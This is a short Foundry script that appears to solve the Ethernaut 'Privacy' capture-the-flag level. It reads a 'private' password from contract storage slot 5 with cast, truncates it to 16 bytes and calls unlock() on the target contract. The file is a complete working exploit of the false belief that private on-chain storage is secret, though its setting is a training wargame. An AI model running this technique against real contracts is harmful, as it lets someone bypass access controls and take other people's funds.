// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "../src/Privacy.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract PrivacySolution is Script {

    address target = 0x1502Bb81a358ba9d3Fc3f586003426E6338B0802;
    Privacy privacy = Privacy(target);
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        privacy.unlock(0x61fbc9d658ffc07d52c74b8b2ee73466);
        console.log("Locked : ", privacy.locked());
        
        vm.stopBroadcast();
    }
}

// cast storage 0x1502Bb81a358ba9d3Fc3f586003426E6338B0802 5
// 0x61fbc9d658ffc07d52c74b8b2ee734663d8254941569788583e82cc6bbd0e20f

// python -c 'data="61fbc9d658ffc07d52c74b8b2ee734663d8254941569788583e82cc6bbd0e20f"; print(data[:32])'
// 61fbc9d658ffc07d52c74b8b2ee73466